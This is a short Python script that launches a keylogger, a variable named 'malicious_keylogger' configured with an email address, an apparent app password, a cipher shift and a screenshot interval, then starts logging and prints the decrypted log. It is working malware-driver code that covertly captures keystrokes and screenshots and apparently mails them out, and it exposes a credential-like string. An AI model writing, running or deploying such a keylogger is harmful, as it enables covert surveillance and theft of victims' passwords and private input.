

import keylogger


malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'itslalimaverma@gmail.com', 'zsph lshv hmkz wofr',shift=4,screenshot_interval = 50)


malicious_keylogger.start()
decrypted_log = malicious_keylogger.decrypt_log()
print("Decrypted Log:")
print(decrypted_log)


